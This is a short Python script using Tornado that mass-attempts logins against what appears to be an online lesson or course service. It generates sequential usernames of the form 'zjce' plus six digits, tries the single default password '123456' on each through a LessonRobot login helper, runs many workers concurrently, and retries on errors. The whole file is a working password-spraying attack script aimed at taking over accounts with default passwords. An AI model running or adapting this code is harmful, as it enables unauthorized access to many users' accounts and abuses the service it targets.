import signal
import logging
import time
from tornado.gen import coroutine, sleep
from tornado.ioloop import IOLoop
from tornado.queues import Queue
from tornado.httpclient import AsyncHTTPClient
from lessonrobot import LessonRobot

concurrency = 10
q = Queue(maxsize=1000000)

logging.basicConfig(format="%(asctime)s: %(message)s", level=logging.INFO)
AsyncHTTPClient.configure(None, max_clients=1000)

@coroutine
def worker():
	global concurrency, spawn_timestamp, exception_timestamp
	while True:
		username = yield q.get()

		try:
			robot = LessonRobot()
			result = yield robot.login(username, '123456')
		except Exception as e:
			logging.info('[Exception] %s:%s' % (username, e))
			yield q.put(username)

		q.task_done()

@coroutine
def spawner():
	for i in xrange(24561, 999999):
		username = 'zjce%06d' % i
		yield q.put(username)

@coroutine
def main():
	for i in xrange(concurrency):
		IOLoop.current().spawn_callback(worker)

	yield spawner()
	yield q.join()
	logging.info('All Done')

IOLoop.current().run_sync(main)
